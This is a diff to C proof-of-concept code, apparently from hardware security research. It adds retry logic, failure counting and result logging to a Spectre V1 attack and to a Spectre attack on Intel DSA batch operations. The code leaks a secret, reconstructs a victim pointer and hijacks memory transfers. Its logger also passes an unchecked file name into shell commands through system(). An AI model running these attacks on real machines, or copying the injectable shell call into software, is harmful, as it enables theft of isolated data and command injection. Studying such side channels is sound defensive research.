@@ -3,11 +3,43 @@
 int main(int argc, char *argv[]) {
     srand(time(NULL));
     bufferSize = (unsigned int)strtoul(argv[1], NULL, 10);
+    double spectreFailRatio, batchFailRatio;
+    uint64_t retryCount=0;
 
     //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
     //~~~~~~~~~~~~ BEGIN TESTS ~~~~~~~~~~~~//
-    TestSpectre();
-    spectreDSABatch();
+    compilerMFence();
+    for(int i=0; i<1; i++)
+    {
+        // Redo for every fail enQ
+        if(spectreDSABatch())
+        {
+            printf("Failed EnQ - Rerunning...\n");
+            usleep(1);
+            retryCount++;
+            i--;
+            continue;
+        }
+        spectreDSABatch();
+        TestSpectre();
+
+        compilerMFence();
+        usleep(1);
+        compilerMFence();
+    }
+    spectreFailRatio = (double)spectreFailsV1/(double)1;
+    batchFailRatio = (double)spectreFailsBatch/(double)1;
+
+    printf("\nRetry Count = %lu\n", retryCount);
+
+    printf("\nSpectre V1 Fails = %lu (%.2f%%)\n", spectreFailsV1, spectreFailRatio*100);
+    printf("Batch Spectre Fails = %lu (%.2f%%)\n\n", spectreFailsBatch, batchFailRatio*100);
+
+    resArr[SpectreV1Attk] = spectreFailsV1;
+    resArr[DSABatchAttk] = spectreFailsBatch;
+
+    parseResults(argv[2]);
+
     return 0;
 }
 
@@ -26,7 +58,7 @@ uint8_t enqcmd(void *_dest, const void *_src){
     return 0; // ((endTimeEnQ-startTimeEnQ)>15000 || (endTimeDSA-startTimeDSA)>15000);
 }
 
-void spectreDSABatch(){
+int spectreDSABatch(){
     printf("\n|-- DSA Batch Spectre V1 --|\n------------------\n");
     int randIndex, junk, runs=500, runCount=0;
     bool breakLoop = false;
@@ -167,22 +199,31 @@ void spectreDSABatch(){
         printf("\nSuccessfully reconstructed secret pointer! Inserting our malicious destinations for OPs...\n");
         buildDSAAttackOp();
         end = rdtsc();
+
+        cpuMFence();
+        uint8_t batchRetry = 0;
         for(int i=0; i<MAX_BATCHSZ; i++)
-            valueCheck(srcVictimArr[i], dstAttkArr[i], bufferSize, "[DSA Batch Attack] ");
+        {
+            if(memcmp(srcVictimArr[i], dstAttkArr[i], bufferSize) != 0)
+                return 1;
+        }
+
         printf("\n--[SUCCESS]-- Successfully hijacked %luKB-Sized Transfer!\n", (bufferSize*MAX_BATCHSZ)/1024);
         printf("-- Leakage Rate of Attack: %.3f bits/cycle\n", (double)((bufferSize*MAX_BATCHSZ) * 8) / (double)((end-start)-RTDSC_latency));
     }else{
         end = rdtsc();
         printf("\n~FAIL~: Secret Pointer Mismatch!\n");
+        spectreFailsBatch++;
     }
 
     printf("\n     |--Elapsed Runtime for Attack--|\n\t Cycles =\t%ld\n\t Runs =\t\t%d\n", end-start, runCount);
 
     printf("--------------------------------\n\n");
+    return 0;
 }
 
 // Build our own DSA bulk op from stolenPointer
-void volatile buildDSAAttackOp(){
+void buildDSAAttackOp(){
     int fd;
 
     // WQ Path Check
@@ -319,14 +360,18 @@ void TestSpectre(){
         // Move on to the next letter in the secret
         attkAddr++;
     }
+    secretGuess[secretLen] = '\0';
 
-    printf("\n\n Spectre Guess:  '%s'\n", secretGuess);
-    printf("Original Secret: '%s'\n", spectreSecret);
+    printf("\n\n Spectre Guess:  '%s' (%d == %d)\n", secretGuess, strlen(secretGuess), secretLen);
+    printf("Original Secret: '%s' (%d)\n", spectreSecret, strlen(spectreSecret));
             
     if(strcmp(spectreSecret,secretGuess)==0)
         printf("\nSUCCESS: Discovered Secret Matches!\n");
     else
+    {
         printf("\n~FAIL~: Secret Mismatch!\n");
+        spectreFailsV1++;
+    }
     end = rdtsc();
 
     printf("-- Leakage Rate of Attack: %.3f bits/cycle\n", (double)((secretLen) * 8) / (double)((end-start)-RTDSC_latency));    
@@ -378,4 +423,42 @@ uint8_t spectreV1Gadget(size_t x){
         return arr2[arr1[x] * 512];
 
     return 0;
+}
+
+void parseResults(char* fileName){
+    char cmdStr[256];
+
+    // Open the file in read mode to check if it exists
+    FILE *file = fopen(fileName, "r");
+
+    // File doesn't exist, create it and write the header
+    if (file == NULL)
+    {
+        file = fopen(fileName, "w");
+        detailedAssert((file != NULL), "parseResults() - Could not open or create resFile.");
+        fputs(_headerStr_, file);
+        fclose(file);
+        printf("\tCreated new resFile: %s\n", fileName);
+    } else {
+        // File already exists, just close it without modifying - will append later
+        fclose(file);
+    }
+
+    // Open the file in append mode and add the new line of data
+    file = fopen(fileName, "a");
+    detailedAssert((file != NULL), "parseResults() - Could not open resFile to append data.");
+
+    for (int i=0; i<NUM_TESTS; i++)
+        fprintf(file, "   %lu    ", resArr[i]);
+    
+    fprintf(file, "\n");
+
+    fclose(file);
+
+    // Now, straighten out all the columns:
+    system("touch results/.dsaTemp");
+    snprintf(cmdStr, sizeof(cmdStr), "column -t %s > results/.dsaTemp", fileName);
+    system(cmdStr);
+    snprintf(cmdStr, sizeof(cmdStr), "mv results/.dsaTemp %s", fileName);
+    system(cmdStr);
 }
